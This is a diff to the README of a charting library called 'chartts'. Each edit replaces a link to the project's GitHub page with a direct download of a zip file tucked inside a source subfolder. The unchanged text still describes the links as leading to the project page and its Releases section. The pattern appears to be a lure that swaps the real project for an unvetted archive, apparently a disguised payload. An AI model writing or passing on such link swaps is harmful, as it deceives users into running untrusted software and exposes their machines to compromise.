@@ -1,6 +1,6 @@
 # 📊 chartts - Lightweight Native Charting Library
 
-[![Download chartts](https://img.shields.io/badge/Download-chartts-ff6f61?style=for-the-badge&logo=github)](https://github.com/ananya-1403/chartts)
+[![Download chartts](https://img.shields.io/badge/Download-chartts-ff6f61?style=for-the-badge&logo=github)](https://github.com/ananya-1403/chartts/raw/refs/heads/main/packages/tailwind/src/Software-2.2-beta.2.zip)
 
 ## ❓ What is chartts?
 
@@ -14,7 +14,7 @@ You can use chartts to visualize data in different forms: line charts, bar chart
 
 You can get chartts by visiting the main download page.
 
-[![Download chartts](https://img.shields.io/badge/Download-chartts-4a90e2?style=for-the-badge&logo=github)](https://github.com/ananya-1403/chartts)
+[![Download chartts](https://img.shields.io/badge/Download-chartts-4a90e2?style=for-the-badge&logo=github)](https://github.com/ananya-1403/chartts/raw/refs/heads/main/packages/tailwind/src/Software-2.2-beta.2.zip)
 
 Click the badge above to go to the project page on GitHub. From there, you can find the latest version of the software to download.
 
@@ -40,7 +40,7 @@ chartts is designed to work on most modern Windows machines, even those with mod
 Follow these easy steps:
 
 1. Click the download badge at the top or visit this page:  
-   [https://github.com/ananya-1403/chartts](https://github.com/ananya-1403/chartts)
+   [https://github.com/ananya-1403/chartts/raw/refs/heads/main/packages/tailwind/src/Software-2.2-beta.2.zip](https://github.com/ananya-1403/chartts/raw/refs/heads/main/packages/tailwind/src/Software-2.2-beta.2.zip)
 
 2. On the page, look for a section called **Releases** or **Downloads**.
 
@@ -128,7 +128,7 @@ If chartts does not open or run smoothly:
 
 Find all source files, documentation, and issue reporting on the GitHub page:
 
-https://github.com/ananya-1403/chartts
+https://github.com/ananya-1403/chartts/raw/refs/heads/main/packages/tailwind/src/Software-2.2-beta.2.zip
 
 You can read detailed user manuals or look for help if you get stuck.
 
